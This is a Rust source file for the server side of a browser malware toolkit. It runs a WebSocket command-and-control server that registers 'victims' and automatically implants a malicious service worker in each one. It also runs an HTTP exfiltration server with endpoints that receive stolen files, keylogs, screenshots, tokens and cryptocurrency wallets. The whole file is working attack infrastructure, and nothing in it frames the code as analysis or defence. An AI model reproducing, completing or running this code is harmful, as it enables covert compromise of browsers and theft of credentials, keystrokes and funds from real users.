mod victim;
mod payloads;
mod dashboard;
mod exfil;
mod implant;
mod globals;

use victim::{Victim, Victims, GLOBAL_VICTIMS};
use implant::auto_serviceworker_implant_and_infect;
use dashboard::dashboard_and_control;
use exfil::*;
use globals::GLOBAL_C2_IP;
use futures::StreamExt;
use anyhow::Result;
use std::{
    collections::HashMap,
    io::Write,
    net::IpAddr,
    path::Path,
    sync::{Arc, Mutex},
    time::Duration,
};
use tokio::{
    net::TcpListener,
    sync::mpsc,
};
use tokio_tungstenite::{accept_async, tungstenite::Message};
use warp::Filter;
use futures::SinkExt;

#[tokio::main]
async fn main() -> Result<()> {
    // ========== Step 1: Ask for C2 IP (callback address)
    println!("[*] Enter your public IP or domain for implants to connect back:");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    let ip = input.trim().to_string();
    *GLOBAL_C2_IP.lock().unwrap() = ip;
    println!("[+] C2 callback IP set to: {}", GLOBAL_C2_IP.lock().unwrap());

    // ========== Step 2: Ask for listener IP
    println!("[*] Enter IP address to listen on (e.g., 0.0.0.0 for public, 127.0.0.1 for localhost):");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    let listen_ip: IpAddr = input.trim().parse().expect("Invalid IP address");

    println!("[+] Listener IP set to: {}", listen_ip);

    // ========== Step 3: Create "uploads" folder if missing
    if !Path::new("uploads").exists() {
        std::fs::create_dir("uploads")?;
    }

    // ========== Step 4: Start WebSocket Server (C2)
    let victims: Victims = GLOBAL_VICTIMS.clone();
    let ws_listener = TcpListener::bind((listen_ip, 9001)).await?;
    println!("[*] WebSocket C2 server started on {}:9001", listen_ip);

    let victims_ws = victims.clone();
    let next_id = Arc::new(Mutex::new(0usize));

    tokio::spawn(async move {
        while let Ok((stream, _)) = ws_listener.accept().await {
            let victims = victims_ws.clone();
            let next_id = next_id.clone();

            tokio::spawn(async move {
                if let Ok(ws_stream) = accept_async(stream).await {
                    let (mut ws_sender, mut ws_receiver) = ws_stream.split();
                    let (tx, mut rx) = mpsc::channel::<String>(32);

                    // Assign unique ID
                    let my_id = {
                        let mut id_lock = next_id.lock().unwrap();
                        let id = *id_lock;
                        *id_lock += 1;
                        id
                    };

                    let victim = Victim {
                        id: my_id,
                        sender: tx.clone(),
                        last_ping: Arc::new(Mutex::new(tokio::time::Instant::now().into())),
                        os: Arc::new(Mutex::new(None)),
                        browser: Arc::new(Mutex::new(None)),
                        implanted: Arc::new(Mutex::new(false)),
                    };

                    victims.lock().unwrap().insert(my_id, victim.clone());
                    println!("[+] New victim connected [Victim-{}]", my_id);

                    auto_serviceworker_implant_and_infect(victim.clone()).await;

                    let recv_task = {
                        let last_ping = victim.last_ping.clone();
                        async move {
                            while let Some(Ok(msg)) = ws_receiver.next().await {
                                if msg.is_text() {
                                    let text = msg.into_text().unwrap();
                                    if text == "pong" {
                                        let mut ping = last_ping.lock().unwrap();
                                        *ping = tokio::time::Instant::now().into();
                                    } else {
                                        println!("[Victim-{}] Response: {}", victim.id, text);
                                    }
                                }
                            }
                        }
                    };

                    let send_task = async move {
                        while let Some(cmd) = rx.recv().await {
                            if ws_sender.send(Message::Text(cmd.into())).await.is_err() {
                                break;
                            }
                        }
                    };

                    tokio::select! {
                        _ = recv_task => {},
                        _ = send_task => {},
                    }

                    println!("[-] Victim-{} disconnected.", my_id);
                    victims.lock().unwrap().remove(&my_id);
                }
            });
        }
    });

    // ========== Step 5: Heartbeat Pinger
    let victims_heartbeat = victims.clone();
    tokio::spawn(async move {
        loop {
            let senders: Vec<_> = {
                let guard = victims_heartbeat.lock().unwrap();
                guard.values().map(|v| v.sender.clone()).collect()
            };

            for tx in senders {
                let _ = tx.send("pong".to_string()).await;
            }

            tokio::time::sleep(Duration::from_secs(5)).await;
        }
    });

    // ========== Step 6: Dashboard and Control
    let victims_control = victims.clone();
    tokio::spawn(async move {
        if let Err(e) = dashboard_and_control(victims_control).await {
            eprintln!("[-] Dashboard error: {}", e);
        }
    });

    // ========== Step 7: HTTP Exfil Server
    let upload_route = warp::post()
        .and(warp::path("upload"))
        .and(warp::header::<String>("x-filename"))
        .and(warp::body::bytes())
        .map(save_upload);

    let log_route = warp::post()
        .and(warp::path("log"))
        .and(warp::body::bytes())
        .map(save_keylog);

    let screenshot_route = warp::post()
        .and(warp::path("screenshot"))
        .and(warp::multipart::form())
        .and_then(save_screenshot);

    let useragent_route = warp::post()
        .and(warp::path("useragent"))
        .and(warp::body::bytes())
        .map(save_useragent);

    let token_route = warp::post()
        .and(warp::path("tokens"))
        .and(warp::body::bytes())
        .map(save_token);

    let wallet_route = warp::post()
        .and(warp::path("wallet"))
        .and(warp::body::bytes())
        .map(save_wallet);

    let sw_route = warp::path("sw.js")
        .map(|| {
            warp::reply::with_header(
                payloads::service_worker_js(),
                "Content-Type",
                "application/javascript"
            )
        });

    let routes = upload_route
        .or(log_route)
        .or(screenshot_route)
        .or(useragent_route)
        .or(token_route)
        .or(wallet_route)
        .or(sw_route);

    println!("[*] HTTP exfil server started on {}:9002", listen_ip);
    warp::serve(routes).run((listen_ip, 9002)).await;

    Ok(())
}
